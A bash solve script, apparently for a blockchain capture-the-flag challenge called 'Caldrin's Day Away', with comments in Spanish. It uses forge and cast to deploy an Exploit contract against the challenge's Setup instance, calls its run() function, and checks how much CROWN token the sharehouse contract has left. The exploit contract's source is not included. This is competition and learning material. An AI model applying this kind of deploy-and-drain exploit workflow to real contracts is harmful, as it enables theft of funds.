#!/usr/bin/env bash
# Despliega y ejecuta el exploit de "Caldrin's Day Away" contra la instancia remota.
#
#   RPC=http://IP:PORT/<uuid> PK=0x... SETUP=0x... ./solve.sh
#
# Los tres valores salen del panel del reto (rpc endpoint / private key / setup contract).
set -euo pipefail

export PATH="$HOME/.foundry/bin:$PATH"
cd "$(dirname "$0")/forge"

: "${RPC:?falta RPC (endpoint del reto)}"
: "${PK:?falta PK (private key del reto)}"
: "${SETUP:?falta SETUP (direccion del contrato Setup)}"

echo "[*] estado inicial"
cast call "$SETUP" 'isSolved()(bool)' --rpc-url "$RPC"

echo "[*] desplegando Exploit..."
# ojo: --constructor-args es variadico, tiene que ir el ultimo de todo
EXPLOIT=$(forge create src/Exploit.sol:Exploit \
    --rpc-url "$RPC" --private-key "$PK" --broadcast --json \
    --constructor-args "$SETUP" \
    | python3 -c 'import sys,json; print(json.load(sys.stdin)["deployedTo"])')
echo "[+] Exploit en $EXPLOIT"

echo "[*] ejecutando run()..."
cast send "$EXPLOIT" 'run()' --rpc-url "$RPC" --private-key "$PK" >/dev/null
echo "[+] run() minado"

SH=$(cast call "$SETUP" 'sharehouse()(address)' --rpc-url "$RPC")
CROWN=$(cast call "$SETUP" 'crownCoin()(address)' --rpc-url "$RPC")
echo "[*] sharehouse CROWN restante:"
cast call "$CROWN" 'balanceOf(address)(uint256)' "$SH" --rpc-url "$RPC"
echo "[*] isSolved():"
cast call "$SETUP" 'isSolved()(bool)' --rpc-url "$RPC"
